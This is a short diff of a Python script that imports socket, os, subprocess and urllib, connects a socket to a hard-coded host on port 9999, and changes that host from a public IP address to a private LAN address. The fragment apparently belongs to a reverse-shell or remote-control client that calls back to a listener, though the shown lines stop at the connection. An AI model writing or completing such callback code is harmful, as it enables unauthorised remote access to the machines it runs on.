@@ -3,7 +3,7 @@
 import socket, os, subprocess, urllib.request, urllib.parse, re, time
 
 s = socket.socket()
-host = "168.235.86.52"
+host = "192.168.1.172"
 port = 9999
 
 s.connect((host, port))
